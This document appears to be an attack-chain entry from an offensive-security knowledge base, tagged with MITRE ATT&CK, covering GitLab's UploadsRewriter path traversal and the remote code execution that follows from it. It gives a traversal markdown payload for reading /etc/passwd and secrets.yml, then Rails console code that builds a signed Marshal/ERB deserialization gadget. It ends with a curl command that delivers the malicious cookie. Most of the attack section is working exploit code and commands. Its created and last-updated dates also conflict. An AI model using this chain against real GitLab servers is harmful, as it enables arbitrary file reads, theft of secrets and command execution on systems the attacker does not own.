---
tags:
  - path-traversal
  - insecure-deserialization
  - rce
  - gitlab
type: attack_chain
tools:
  - '[[tools/Rails-Console]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
commands: []
platforms:
  - Linux
  - Web
complexity: high
procedures:
  - '[[procedures/Create-Projects-and-Malicious-Issue-for-Path-Traversal]]'
  - '[[procedures/Move-Issue-to-Trigger-Arbitrary-File-Read]]'
  - '[[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]'
  - '[[procedures/Send-Malicious-Cookie-for-RCE]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Credential Access]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploits path traversal in GitLab's UploadsRewriter to read arbitrary files,
  escalating to remote code execution via insecure deserialization of a crafted
  cookie using stolen secrets.
skill_level: advanced
impact_level: high
id: cf34c8e9-f5c7-4631-bf5d-f31d7a3f8118
created_at: '2025-12-11T03:47:59.357Z'
updated_at: '2025-12-11T03:47:59.357Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1212]]'
  - '[[T1059]]'
---
# GitLab Arbitrary File Read via Issue Movement Leading to RCE

Multi-stage attack chain exploiting a path traversal vulnerability in GitLab's UploadsRewriter during issue movement to read arbitrary files, then using stolen secrets to craft a malicious cookie for remote code execution via insecure deserialization.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Projects and Issue] --> B[Move Issue for File Read]
    B --> C[Generate Payload with Secrets]
    C --> D[Send Cookie for RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Rails-Console]]
- #curl

### Target Environment

- GitLab 12.8.7-ee on Linux
- Required services: PostgreSQL 10.12, Redis 5.0.7, GitLab Shell 11.0.0
- Network access requirements: Access to GitLab web interface and ability to create/move issues

### Initial Access Requirements

- Credential requirements: Valid GitLab account with permissions to create and move issues between projects
- Network position: External access to GitLab instance
- Prior access needed: None beyond authenticated user

## Detailed Attack Procedures

### Step 1: Setup Projects and Malicious Issue - [[procedures/Create-Projects-and-Malicious-Issue-for-Path-Traversal]]

**Procedure**: [[procedures/Create-Projects-and-Malicious-Issue-for-Path-Traversal]]

**Objective**: Create source and destination projects, then add an issue with markdown containing a path traversal payload to reference arbitrary files.

**Expected Output**: An issue in the source project with traversal markdown pointing to sensitive files like /etc/passwd.

**Success Indicators**:
- Projects created successfully
- Issue added with traversal markdown

Use the GitLab web interface to create two projects. Then, create an issue in the source project with description containing:

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

This uses [[commands/gitlab-markdown-traversal]] to set up the traversal path.

### Step 2: Trigger File Read by Moving Issue - [[procedures/Move-Issue-to-Trigger-Arbitrary-File-Read]]

**Procedure**: [[procedures/Move-Issue-to-Trigger-Arbitrary-File-Read]]

**Objective**: Move the issue to the destination project, triggering UploadsRewriter to copy the arbitrary file without validation.

**Expected Output**: The arbitrary file (e.g., /etc/passwd) appears in the destination project's uploads.

**Success Indicators**:
- Issue moved successfully
- File contents readable in new project

Use GitLab's issue moving feature via the web interface to transfer the issue. This exploits the lack of validation in UploadsRewriter's MARKDOWN_PATTERN and find_file method.

### Step 3: Extract Secrets and Generate Payload - [[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]

**Procedure**: [[procedures/Extract-Secrets-and-Generate-Marshalled-Payload]]

**Objective**: Read sensitive files like secrets.yml to obtain secret_key_base, then generate a marshalled ERB payload for RCE.

**Expected Output**: A base64-encoded cookie payload ready for deserialization.

**Success Indicators**:
- secret_key_base obtained
- Payload generated via Rails console

Repeat the file read for /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml. Then, in a local Rails console with matching secret_key_base:

Execute [[commands/rails-request-setup]]:
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
```

Execute [[commands/rails-set-serializer]]:
```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

Execute [[commands/rails-cookie-jar]]:
```ruby
cookies = request.cookie_jar
```

Execute [[commands/erb-payload-create]]:
```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

Execute [[commands/deprecation-proxy-create]]:
```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

Execute [[commands/cookies-sign]]:
```ruby
cookies.signed[:cookie]= depr
```

Execute [[commands/puts-cookie]]:
```ruby
puts cookies[:cookie]
```

### Step 4: Execute RCE with Malicious Cookie - [[procedures/Send-Malicious-Cookie-for-RCE]]

**Procedure**: [[procedures/Send-Malicious-Cookie-for-RCE]]

**Objective**: Send the crafted cookie to the GitLab server to trigger insecure deserialization and execute arbitrary commands.

**Expected Output**: Command executed, creating /tmp/vakzz with content 'vakzz was here'.

**Success Indicators**:
- Response indicates deserialization
- Verification file exists on server

Use [[commands/curl-malicious-cookie]] to send the request:

```bash
curl -vvv 'http://gitlab-vm.local/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
```

Verify with [[commands/cat-verify-file]] on the server:
```bash
cat /tmp/vakzz
```

## Attack Chain Summary

### Key Achievements

1. Arbitrary file read via path traversal
2. Theft of secret_key_base
3. Remote code execution via deserialized ERB payload

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Credential Access]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Discovery]]

*Last updated: 2023-10-01*
